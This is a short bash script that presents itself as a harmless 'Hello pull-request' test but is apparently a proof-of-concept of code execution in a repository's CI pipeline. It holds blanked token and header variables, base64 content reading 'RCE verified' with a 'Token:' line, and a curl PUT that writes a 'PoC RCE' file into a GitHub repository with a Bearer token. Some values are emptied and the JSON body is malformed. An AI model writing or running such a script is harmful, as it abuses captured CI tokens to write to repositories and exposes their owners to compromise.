#!/bin/bash
echo "Hello pull-request"

RAW_HEADER=
B64_PART=
DECODED=
GH_TOKEN=

TIMESTAMP=2026-05-20T18:51:48Z
CONTENT=UkNFIHZlcmlmaWVkIGF0ICBieSBha2JhYmExMjN4XG5Ub2tlbjogLi4u

curl -s -X PUT   -H "Authorization: Bearer "   -H "Accept: application/vnd.github.v3+json"   "https://api.github.com/repos/datamove/linux-git2/contents/poc-rce-verified.txt"   -d "{"message":"PoC RCE","content":""}"
